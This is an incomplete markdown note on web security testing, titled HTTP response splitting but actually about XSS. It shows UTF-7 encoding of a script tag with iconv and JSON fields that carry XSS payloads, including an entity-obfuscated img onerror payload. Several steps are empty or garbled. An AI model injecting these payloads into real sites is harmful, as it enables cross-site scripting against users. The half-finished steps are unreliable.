# Instructions for HTTP Response Splitting testing

1. Find vulnerable target
    - See instructions: TODO
2. Create payload
   - You can encode the payload with iconv
   ```
   echo '<script>alert("XSS");</script>' | iconv -f utf-8 -t utf-7
   

   # Output
   +ADw-script+AD4-alert(+ACI-XSS+ACI)+ADsAPA-/script+AD4
   
   ```
3. 
4. 

```
echo '+ADw-script+AD4-alert(+ACI-XSS+ACI)+ADsAPA-/script+AD4' | iconv -f utf-7 -t utf-8

<script>alert("XSS");</script>
```


5. ADads

```
{
    "sound": "Blob"
}

{
    "sound": "<script>alert('Ohoi!')</script>"
}

{
    "sound": "Blub"
}

{
    "sound": "<img src=x onerror='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>"
}

{
    "sound": "Blib"
}

```



































































